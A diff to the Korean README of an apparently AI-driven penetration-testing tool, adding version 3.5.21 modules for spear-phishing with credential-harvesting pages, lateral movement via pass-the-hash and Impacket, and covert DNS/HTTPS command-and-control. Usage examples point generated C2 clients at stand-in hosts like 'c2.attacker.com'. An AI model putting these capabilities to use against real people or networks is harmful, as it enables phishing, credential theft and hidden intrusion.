@@ -6,7 +6,7 @@
 
 **AI 침투테스트 터미널 1위**
 
-[![Version](https://img.shields.io/badge/version-3.5.20-brightgreen)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-3.5.21-brightgreen)](https://github.com/bingook/bingo/releases)
 [![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
 [![Python](https://img.shields.io/badge/python-3.12%20%7C%203.13-blue)](https://python.org)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
@@ -1264,6 +1264,70 @@ GitHub Actions에서 AI 코딩 에이전트(Claude Code, GitHub Copilot, Gemini 
 
 ---
 
+## v3.5.21 신규 기능 — 全面APT化: AI 피싱 · 공급망 · 내부망 횡이동 · 은폐 C2
+
+> **v3.5.21**은 4가지 APT급 공격 모듈을 통합 `/apt` 슬래시 커맨드로 제공하며, 채팅 모드 자동 감지와 KO/ZH/EN 다국어 힌트를 지원합니다.
+
+### APT 모듈 개요
+
+| 모듈 | 커맨드 | 설명 |
+|---|---|---|
+| AI 스피어피싱 | `/apt phish <email> [lure]` | OSINT 프로파일링 → 개인화된 스피어피싱 이메일 + HTML 자격증명 수집 페이지 + GoPhish 설정 |
+| 공급망 취약점 스캐너 | `/apt supply <path>` | npm/pip/GitHub Actions 의존성 스캔 — Dependency Confusion, Typosquatting, 악성 패키지 IOC 조회 |
+| 내부망 횡방향 이동 | `/apt lateral <ip> [user] [hash]` | Impacket/CrackMapExec/SSH/BloodHound/PTH/PTT 명령 자동 생성 |
+| 은폐 C2 채널 | `/apt c2 <host> [dns\|https\|both]` | DNS 터널링 C2 (base32/TXT) + HTTPS Beacon C2 (AES-256-CBC, Jitter, Domain Fronting) |
+
+### 신규 파일
+
+```
+bingo/core/apt/__init__.py
+bingo/core/apt/phishing.py         # 모듈 1 — AI 스피어피싱 생성기
+bingo/core/apt/supply_chain.py     # 모듈 2 — 공급망 취약점 스캐너
+bingo/core/apt/lateral_movement.py # 모듈 3 — 내부망 횡방향 이동
+bingo/core/apt/c2_channel.py       # 모듈 4 — 은폐 C2 채널 생성기
+```
+
+### 빠른 시작
+
+```python
+# 스피어피싱
+from bingo.core.apt.phishing import quick_phish
+result = quick_phish("ceo@target.com", lure="invoice")
+print(result.subject, result.body)
+
+# 공급망 스캔
+from bingo.core.apt.supply_chain import SupplyChainScanner
+findings = SupplyChainScanner("./package.json").scan()
+
+# 횡방향 이동 명령 생성
+from bingo.core.apt.lateral_movement import quick_lateral_commands
+cmds = quick_lateral_commands("10.0.0.5", username="admin", password="hash123")
+
+# 은폐 C2 — DNS 터널
+from bingo.core.apt.c2_channel import CovertC2
+c2 = CovertC2("c2.attacker.com")
+print(c2.generate_dns_client())
+
+# 은폐 C2 — HTTPS Beacon
+c2 = CovertC2("cdn.attacker.com")
+print(c2.generate_https_client())
+```
+
+### 채팅 모드 자동 감지 (v3.5.21)
+
+명령 실행 결과에서 APT 컨텍스트를 자동 탐지하여 힌트를 주입합니다:
+
+| 탐지 패턴 | 자동 힌트 |
+|---|---|
+| 사설 IP / SMB / RPC / LDAP | `🔀 내부망 탐지 — /apt lateral <IP>` |
+| `package.json` / `requirements.txt` / `.github/workflows` | `⛓️ 공급망 파일 탐지 — /apt supply <path>` |
+| 이메일 주소 / LinkedIn / OSINT | `🎣 피싱 컨텍스트 감지 — /apt phish <email>` |
+| C2 / beacon / callback / tunnel | `🕵️ C2 컨텍스트 감지 — /apt c2 <host>` |
+
+> 모든 모듈은 명령/스크립트만 생성합니다. 실제 공격은 사용자가 직접 실행하기 전에는 수행되지 않습니다. 허가된 레드팀/침투테스트 환경에서만 사용하세요.
+
+---
+
 ## v3.5.20 신규 기능 — 0day Hunter v2: 5가지 실제 0day/N-day 익스플로잇 통합
 
 > **v3.5.20**은 0day Hunter에 연구 등급 취약점 5종 모듈을 추가하여 채팅 모드에서 자동으로 작동합니다.
@@ -1813,6 +1877,7 @@ headers = {
 
 | 버전 | 요약 |
 |------|------|
+| v3.5.21 | **全面APT化** — APT 모듈 4종 신규 (`bingo/core/apt/`): AI 스피어피싱 생성기 (OSINT 프로파일링, HTML 루어 페이지, GoPhish 설정), 공급망 취약점 스캐너 (npm/pip/GitHub Actions, Dependency Confusion, Typosquatting, 악성 패키지 IOC), 내부망 횡방향 이동 (Impacket/CME/SSH/BloodHound/PTH/PTT 명령 생성), 은폐 C2 채널 (DNS 터널 base32/TXT + HTTPS Beacon AES-256-CBC + Jitter + Domain Fronting); `/apt` 슬래시 커맨드; 채팅 모드 4가지 컨텍스트 자동 감지; 다국어 i18n 키 17개 신규 (KO/ZH/EN) |
 | v3.5.20 | **0day Hunter v2** — 연구 등급 0day/N-day exploit 모듈 5종: CVE-2024-41713 / CVE-2024-35286 / 0day-LFI (Mitel MiCollab), CVE-2024-20017 (MediaTek wappd UDP 오버플로우), CVE-2023-4863 (libwebp BLASTPASS 힙 오버플로우), CVE-2023-4911 (glibc Looney Tunables LPE), CVE-2024-43035 / CVE-2024-48946 / CVE-2024-9301 (ZeroPath IDOR/RCE/경로순회); `bingo/core/exploits/` PoC 모듈 4개 신규; 채팅 모드 exploit 모듈 힌트 자동 주입; 다국어 i18n 키 8개 신규 (KO/ZH/EN) |
 | v3.5.19 | **0day Hunter** — Dir-1 탐지(버전 핑거프린팅 35개+ 소프트웨어 패턴 + 33개 에러 패턴), Dir-2 익스플로잇(클래스별 PoC 페이로드 힌트 + AI 자동 코드 생성), Dir-3 활용(로컬 CVE DB 35개 (소프트웨어, 버전) 쌍 + NVD API 실시간 조회 + Shodan 폴백 힌트); 채팅 모드 모든 실행 출력에서 자동 작동; 신규 다국어 i18n 키 7개 (KO/ZH/EN); 신규 `bingo/core/zeroday.py` |
 | v3.5.18 | macOS VPN 배너 문구 수정 (자동 조회 시점 정확성) |
@@ -1880,7 +1945,7 @@ MIT © 2026 bingook
 
 *내장 엔진 · HTTP 스머글링 · 환각 방지 가드 · 역할 기반 테스팅 · 취약점 관리 · 타겟 메모리 · LLM 오케스트레이터 — 유일한 올인원 AI 침투 도구*
 
-[![Version](https://img.shields.io/badge/version-3.5.20-brightgreen)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-3.5.21-brightgreen)](https://github.com/bingook/bingo/releases)
 [![PyPI](https://img.shields.io/pypi/v/bingo-ai.svg)](https://pypi.org/project/bingo-ai/)
 
 </div>
